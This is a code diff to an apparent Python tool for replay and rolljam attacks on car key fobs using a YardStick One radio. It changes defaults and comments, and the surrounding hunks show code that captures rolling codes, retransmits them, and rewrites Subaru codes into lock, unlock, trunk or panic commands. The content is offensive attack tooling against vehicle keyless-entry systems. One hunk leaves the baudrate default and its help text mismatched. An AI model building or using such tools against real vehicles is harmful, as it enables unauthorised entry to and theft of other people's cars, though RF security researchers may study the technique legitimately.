@@ -1,10 +1,7 @@
-#improve receive function (use unique codes)
-#change default baudrate to 4000
-#regex for specific cars (camaro for filter, subaru for both)
-#comment code properly
 #figure out bandwidth settings for rolljam
 #write readme.md with documentation, jamming info
 #make function for rfcat setup?
+#comment code properly
 
 import argparse
 import os
@@ -18,7 +15,7 @@ def main():
     parser = argparse.ArgumentParser(description="Replay and rolljam attacks against car key fobs with the yardstick one. Jammer for rolljam not included; check README.md for options and usage")
     parser.add_argument("functions", choices=['replay', 'rolljam'], help="Replay: Capture everything on a certain frequency and replay it upon pressing enter. | Rolljam: Capture codes and replay the first automatically. Saves remaining codes to use later, and for certain cars these can be altered (Use rolljam with -r or -t to save to/transmit from a file)")
 
-    parser.add_argument("-b", "--baudrate", action="store", type=int, default="4800", help="Default=4800 | Set how quickly bits are read and transferred")
+    parser.add_argument("-b", "--baudrate", action="store", type=int, default="4000", help="Default=4800 | Set how quickly bits are read and transferred")
     parser.add_argument("-f", "--frequency", action="store", type=int, default="315000000", help="Default=315mhz | Set the frequency to receive and transmit on")
     parser.add_argument("-m", "--modulation", action="store", type=str, default="MOD_ASK_OOK", help="Default=ASK_OOK |  Set type of (de)modulation")
     parser.add_argument("-s", "--sleep", action="store", type=int, default="20", help="Default=20 | Changes how many codes are captured before being asked to continue")
@@ -251,7 +248,8 @@ def roll_receive(frequency, baudrate, modulation, rsleep):
     if len(signal)==0:
         print("[-] Received 0 codes")
         exit(1)
-    print(signal)
+    #print(signal)     debug
+    #TODO: add function like bash's "uniq" before returning signal
     return signal  #codes separated by newlines
 
 
@@ -275,7 +273,6 @@ def roll_transmit(frequency, baudrate, modulation, code):
     print("[+] Sending code "+str(code))
     d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*100)
     print("[+] Sent")
-#    d.cleanup()
 
 
 #prints list of supported cars
@@ -293,19 +290,19 @@ def rolljam_car(car, code):
     if car=="subaru":
         if c=="l":
             prefix="lock"
-            #code=code.parse_out_prefix
+            #TODO code=code.parse_out_prefix
             new_code = prefix+code
         elif c=="u":
             prefix="unlock"
-            #code=code.parse_out_prefix
+            #TODO code=code.parse_out_prefix
             new_code = prefix+code
         elif c=="t":
             prefix="trunk"
-            #code=code.parse_out_prefix
+            #TODO code=code.parse_out_prefix
             new_code = prefix+code
         elif c=="p":
             prefix="panic"
-            #code=code.parse_out_prefix
+            #TODO code=code.parse_out_prefix
             new_code = prefix+code
     else:
         print("[-] Changing codes not supported")
@@ -323,13 +320,13 @@ def filter(car, codes):
     if car=="subaru":
         print("Filtering codes for "+car)
         for c in codes:
-            #if passes regex:  prob convert to bin first, then compare, then hex
+            #TODO if passes regex:  prob convert to bin first, then compare, then hex
                 filtered_codes.append(c)
 
     elif car=="camaro":
         print("Filtering codes for "+car)
         for c in codes:
-            #if check for prefix with regex. prob convert to bin compare, then hex
+            #TODO if check for prefix with regex. prob convert to bin compare, then hex
                 filtered_codes.append(c)
 
     else:
